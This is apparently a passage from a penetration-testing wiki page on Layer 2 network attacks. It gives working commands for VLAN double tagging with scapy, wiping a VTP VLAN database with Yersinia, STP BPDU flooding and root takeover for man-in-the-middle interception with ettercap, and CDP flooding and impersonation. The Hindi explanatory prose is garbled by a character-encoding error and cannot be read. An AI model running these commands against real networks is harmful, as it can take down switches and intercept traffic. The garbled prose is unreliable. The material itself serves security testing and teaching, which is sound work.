рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк scapy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╕реНрд╡рд┐рдЪ рддрдХ рдкрд╣реБрдБрдЪ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЖрдк рд╕реАрдзреЗ рдЬреБрдбрд╝реЗ рд╣реБрдП рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ **VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред рдмрд╕ **рдкреЛрд░реНрдЯ рдХреЛ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВ** (рдЬрд┐рд╕реЗ рдЯреНрд░рдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ), рд▓рдХреНрд╖рд┐рдд VLANs рдХреЗ ID рдХреЗ рд╕рд╛рде рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдПрдВ, рдФрд░ рдПрдХ IP рдкрддрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВред рдЖрдк рдкрддреЗ рдХреЛ рдбрд╛рдпрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ (DHCP) рдорд╛рдВрдЧрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк рдЗрд╕реЗ рд╕реНрдерд┐рд░ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдорд╛рдорд▓реЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

рдЕрддрд┐рдерд┐ рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдФрд░ рдЕрдиреНрдп рдкрд░реНрдпрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ, рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN (рдЬрд┐рд╕реЗ _рдкреЛрд░реНрдЯ рдЖрдЗрд╕реЛрд▓реЗрд╢рди_ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ) рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рд╛рдерд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЛ рд░реЛрдХрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЕрд░реНрдерд╛рддреН, рдЧреНрд░рд╛рд╣рдХ **рд╡рд╛рдпрд░рд▓реЗрд╕ рдПрдХреНрд╕реЗрд╕ рдкреЙрдЗрдВрдЯ рд╕реЗ рдЬреБрдбрд╝рддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдПрдХ рджреВрд╕рд░реЗ рдХреЛ рдкрддрд╛ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ**). рдиреЗрдЯрд╡рд░реНрдХ ACLs (рдпрд╛ рдЙрдирдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐) рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдИрдкреА рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдПрдХ рд░рд╛рдЙрдЯрд░ рддрдХ рднреЗрдЬрд╛ рдЬрд╛рдП, рдЬреЛ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рдПрдХ рдкрдбрд╝реЛрд╕реА рд╕рд╛рдереА рдХреЛ рд╡рд╛рдкрд╕ рднреЗрдЬ рджреЗрддрд╛ рд╣реИред

рдпрд╣ рд╣рдорд▓рд╛ рдПрдХ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП рдкреИрдХреЗрдЯ рдХреЛ рдЧреНрд░рд╛рд╣рдХ рдХреЗ IP рдкрд░ рд▓реЗрдХрд┐рди рд░рд╛рдЙрдЯрд░ рдХреЗ MAC рдХреЗ рд╕рд╛рде рднреЗрдЬреЗрдЧрд╛**ред рдлрд┐рд░, **рд░рд╛рдЙрдЯрд░ рдкреИрдХреЗрдЯ рдХреЛ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдкрд╛рд╕ рдкреБрдирдГ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛**ред _Double Tagging Attacks_ рдХреА рддрд░рд╣ рдЖрдк рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдЖрдк рдкреАрдбрд╝рд┐рдд рджреНрд╡рд╛рд░рд╛ рд╕реБрд▓рдн рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВред

### VTP Attacks

**VTP (VLAN Trunking Protocol)** рдПрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕реЗ VLANs рдХреЛ рдХреЗрдВрджреНрд░реАрдп рд░реВрдк рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рд╡рд░реНрддрдорд╛рди VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЯреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реНрд╡рд┐рдЪ рд╡рд┐рд╢реЗрд╖ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реИрдВред рдЬрдм рдХреЛрдИ рддрд╛рд▓рд┐рдХрд╛ рдЕрдкрдбреЗрдЯ рд╣реЛрддреА рд╣реИ, рддреЛ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рдПрдХ рд╕реЗ рдмрдврд╝ рдЬрд╛рддреА рд╣реИред рдФрд░ рдпрджрд┐ рдХреЛрдИ рд╕реНрд╡рд┐рдЪ рдПрдХ рдЙрдЪреНрдЪ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрдкрдиреЗ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдЧрд╛ред

#### VTP рдбреЛрдореЗрди рдореЗрдВ рднреВрдорд┐рдХрд╛рдПрдБ <a href="#ebfc" id="ebfc"></a>

* **VTP рд╕рд░реНрд╡рд░ред** VTP рд╕рд░реНрд╡рд░ рднреВрдорд┐рдХрд╛ рдореЗрдВ рдПрдХ рд╕реНрд╡рд┐рдЪ рдирдП VLANs рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреБрд░рд╛рдиреЗ рд╡рд╛рд▓реЛрдВ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ VLANs рдореЗрдВ рд╕реНрд╡рдпрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИред **рдпрд╣ рдбреЛрдореЗрди рдХреЗ рдЕрдиреНрдп рд╕рджрд╕реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП VTP рдШреЛрд╖рдгрд╛рдПрдБ рднреА рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред**
* **VTP рдХреНрд▓рд╛рдЗрдВрдЯред** рдЗрд╕ рднреВрдорд┐рдХрд╛ рдореЗрдВ рдПрдХ рд╕реНрд╡рд┐рдЪ рдбреЛрдореЗрди рдХреЗ рдЕрдиреНрдп рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ VTP рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХреЗред рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреА VLANs рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╕реАрдорд┐рдд рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрджрд▓рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, **рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ред**
* **VTP рдкрд╛рд░рджрд░реНрд╢реАред** рдЗрд╕ рдореЛрдб рдореЗрдВ, рд╕реНрд╡рд┐рдЪ VTP рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рднрд╛рдЧ рдирд╣реАрдВ рд▓реЗрддрд╛ рд╣реИ рдФрд░ рдкреВрд░реЗ VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкреВрд░реНрдг рдФрд░ рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд╢рд╛рд╕рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдкрд╛рд░рджрд░реНрд╢реА рдореЛрдб рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╕рдордп, рд╕реНрд╡рд┐рдЪ рдХреЗрд╡рд▓ рдЕрдиреНрдп рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ VTP рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдмрд┐рдирд╛ рдЙрдирдХреЗ VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдПред **рдРрд╕реЗ рд╕реНрд╡рд┐рдЪреЛрдВ рдХреА рд╣рдореЗрд╢рд╛ рдПрдХ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рд╢реВрдиреНрдп рд╣реЛрдЧреА рдФрд░ рдЙрди рдкрд░ рд╣рдорд▓рд╛ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ред**

#### рд╡рд┐рдЬреНрдЮрд╛рдкрди рдкреНрд░рдХрд╛рд░ <a href="#b384" id="b384"></a>

* **рд╕рдорд░реА рд╡рд┐рдЬреНрдЮрд╛рдкрди тАФ** VTP рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╣рд░ **300 рд╕реЗрдХрдВрдб (5 рдорд┐рдирдЯ)** рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ VTP рдШреЛрд╖рдгрд╛ред рдЗрд╕ рдШреЛрд╖рдгрд╛ рдореЗрдВ VTP рдбреЛрдореЗрди рдирд╛рдо, рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рдВрд╕реНрдХрд░рдг, рд╕рдордп-рдореБрд╣рд░, рдФрд░ MD5 рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╣реИрд╢ рдореВрд▓реНрдп рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред
* **рд╕рдмрд╕реЗрдЯ рд╡рд┐рдЬреНрдЮрд╛рдкрди тАФ** рдпрд╣ VTP рд╡рд┐рдЬреНрдЮрд╛рдкрди рд╣реИ рдЬреЛ VLAN рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рдмрджрд▓рд╛рд╡ рд╣реЛрдиреЗ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **рд╡рд┐рдЬреНрдЮрд╛рдкрди рдЕрдиреБрд░реЛрдз тАФ** рдпрд╣ VTP рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ VTP рд╕рд░реНрд╡рд░ рд╕реЗ рд╕рдорд░реА рд╡рд┐рдЬреНрдЮрд╛рдкрди рд╕рдВрджреЗрд╢ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рд╣реИред рдЖрдорддреМрд░ рдкрд░ рдпрд╣ рддрдм рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рдХрд┐рд╕реА рд╕реНрд╡рд┐рдЪ рдиреЗ рдПрдХ рд╕рдорд░реА рд╡рд┐рдЬреНрдЮрд╛рдкрди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдЙрдЪреНрдЪ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛ рд╣реЛрддреА рд╣реИред

VTP рдХреЛ **рдХреЗрд╡рд▓ рдПрдХ рдЯреНрд░рдВрдХ рдкреЛрд░реНрдЯ рд╕реЗ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ,** рдХреНрдпреЛрдВрдХрд┐ **VTP рдШреЛрд╖рдгрд╛рдПрдБ рдХреЗрд╡рд▓ рдЯреНрд░рдВрдХ рдкреЛрд░реНрдЯреНрд╕ рдкрд░ рдкреНрд░рд╕рд╛рд░рд┐рдд рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛рддреА рд╣реИрдВред** **рдЗрд╕рд▓рд┐рдП, DTP рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж pentesting рдХрд░рддреЗ рд╕рдордп, рдЖрдкрдХрд╛ рдЕрдЧрд▓рд╛ рд▓рдХреНрд╖реНрдп VTP рд╣реЛ рд╕рдХрддрд╛ рд╣реИред** VTP рдбреЛрдореЗрди рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **Yersinia рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **рдПрдХ VTP рдЗрдВрдЬреЗрдХреНрдЯ рдЪрд▓рд╛рдПрдЧрд╛ рдЬреЛ рдкреВрд░реЗ VLAN** **рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдорд┐рдЯрд╛ рджреЗрдЧрд╛** рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдардк рдХрд░ рджреЗрдЧрд╛ред

{% hint style="info" %}
VTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ **рддреАрди рд╕рдВрд╕реНрдХрд░рдг** рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╣рдорд▓рд╛ рдкрд╣рд▓реЗ рд╕рдВрд╕реНрдХрд░рдг, VTPv1 рдХреЗ рдЦрд┐рд▓рд╛рдл рд╣реИред
{% endhint %}
```bash
yersinia -G #For graphic mode
```
рдкреВрд░реЗ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдорд┐рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП, **deleting all VTP vlans** рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP рд╣рдорд▓реЗ

**рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдЗрдВрдЯрд░рдлреЗрд╕ рдкрд░ BPDU рдлреНрд░реЗрдореНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ STP рд╣рдорд▓реЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХрдо рд╣реИред**

#### **STP BPDU DoS**

рдмрд╣реБрдд рд╕рд╛рд░реЗ BPDUs TCP (Topology Change Notification) рдпрд╛ Conf (рдЬреЛ BPDUs рдЯреЛрдкреЛрд▓реЙрдЬреА рдмрдирд╛рддреЗ рд╕рдордп рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ) рднреЗрдЬрдиреЗ рд╕реЗ рд╕реНрд╡рд┐рдЪ рдУрд╡рд░рд▓реЛрдб рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддреЗ рд╣реИрдВред
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

рдЬрдм рдПрдХ TCP рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕реНрд╡рд┐рдЪреЗрд╕ рдХреА CAM рдЯреЗрдмрд▓ 15 рд╕реЗрдХрдВрдб рдореЗрдВ рдорд┐рдЯ рдЬрд╛рдПрдЧреАред рдлрд┐рд░, рдпрджрд┐ рдЖрдк рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рд▓рдЧрд╛рддрд╛рд░ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ, рддреЛ CAM рдЯреЗрдмрд▓ рд▓рдЧрд╛рддрд╛рд░ рдкреБрдирдГ рдЖрд░рдВрдн рд╣реЛрдЧреА (рдпрд╛ рд╣рд░ 15 рд╕реЗрдХрдВрдб рдореЗрдВ) рдФрд░ рдЬрдм рдпрд╣ рдкреБрдирдГ рдЖрд░рдВрдн рд╣реЛрддреА рд╣реИ, рддреЛ рд╕реНрд╡рд┐рдЪ рдПрдХ рд╣рдм рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИ
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

рд╣рдорд▓рд╛рд╡рд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ STP рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рд┐рдЪ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░, рдЕрдзрд┐рдХ рдбреЗрдЯрд╛ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧреБрдЬрд░реЗрдЧрд╛ред рдпрд╣ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдк рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрддреЗ рд╣реИрдВред\
рдпрд╣ BPDUs CONF рдкреИрдХреЗрдЯреНрд╕ рднреЗрдЬрдХрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдХрд╣рддреЗ рд╣реИрдВ рдХрд┐ **priority** рдорд╛рди рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд░реВрдЯ рд╕реНрд╡рд┐рдЪ рдХреА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рд╕реЗ рдХрдо рд╣реИред
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ 2 рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдирдП рдЯреНрд░реА рдХрд╛ рд░реВрдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрди рд╕реНрд╡рд┐рдЪреЛрдВ рдХреЗ рдмреАрдЪ рдХрд╛ рд╕рд╛рд░рд╛ рдЯреНрд░реИрдлрд┐рдХ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧреБрдЬрд░реЗрдЧрд╛** (рдПрдХ MITM рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP рд╣рдорд▓реЗ

CISCO Discovery Protocol рд╡рд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ CISCO рдЙрдкрдХрд░рдг рдЖрдкрд╕ рдореЗрдВ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВ, **рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреМрди рдЬреАрд╡рд┐рдд рд╣реИ** рдФрд░ рдЙрдирдХреЗ рдкрд╛рд╕ рдХреНрдпрд╛ рд╕реБрд╡рд┐рдзрд╛рдПрдБ рд╣реИрдВред

#### рд╕реВрдЪрдирд╛ рд╕рдВрдЧреНрд░рд╣рдг <a href="#0e0f" id="0e0f"></a>

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, CDP рдЕрдкрдиреЗ рд╕рднреА рдкреЛрд░реНрдЯреНрд╕ рдкрд░ рдШреЛрд╖рдгрд╛рдПрдБ рднреЗрдЬрддрд╛ рд╣реИред** рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдХреЛрдИ рдШреБрд╕рдкреИрдард┐рдпрд╛ рдЙрд╕реА рд╕реНрд╡рд┐рдЪ рдкрд░ рдПрдХ рдкреЛрд░реНрдЯ рд╕реЗ рдЬреБрдбрд╝рддрд╛ рд╣реИ? рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдЪрд╛рд╣реЗ рд╡рд╣ **Wireshark,** **tcpdump** рдпрд╛ **Yersinia** рд╣реЛ, рд╡рд╣ **рдЙрдкрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдореВрд▓реНрдпрд╡рд╛рди рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ**, рдЗрд╕рдХреЗ рдореЙрдбрд▓ рд╕реЗ рд▓реЗрдХрд░ Cisco IOS рд╕рдВрд╕реНрдХрд░рдг рддрдХред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╣ рдЙрд╕реА рд╕рдВрд╕реНрдХрд░рдг рдХреЗ Cisco IOS рдХреЛ рдЧрд┐рди рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕рдореЗрдВ рднреЗрджреНрдпрддрд╛ рдвреВрдВрдв рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### CDP рдлреНрд▓рдбрд┐рдВрдЧ рд╣рдорд▓рд╛ <a href="#0d6a" id="0d6a"></a>

рдЖрдк рд╡рд╛рд╕реНрддрд╡рд┐рдХ CISCO рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдХреЗ рдбрд┐рд╡рд╛рдЗрд╕ рдореЗрдореЛрд░реА рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдХреЗ CISCO рд╕реНрд╡рд┐рдЪ рдкрд░ DoS рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
**flooding CDP table** рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░реЗрдВред рд╕реНрд╡рд┐рдЪ CPU рдЕрдзрд┐рднрд╛рд░рд┐рдд рд╣реЛ рдЬрд╛рдПрдЧрд╛, рд╕рд╛рде рд╣реА CDP рдкрдбрд╝реЛрд╕реА рддрд╛рд▓рд┐рдХрд╛ рднреА, **рдЬрд┐рд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк тАЬрдиреЗрдЯрд╡рд░реНрдХ рдкрдХреНрд╖рд╛рдШрд╛рддтАЭ рд╣реЛрдЧрд╛ред**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
рдЖрдк [**scapy**](https://github.com/secdev/scapy/) рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ `scapy/contrib` рдкреИрдХреЗрдЬ рдХреЗ рд╕рд╛рде рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВред

### VoIP рд╣рдорд▓реЗ

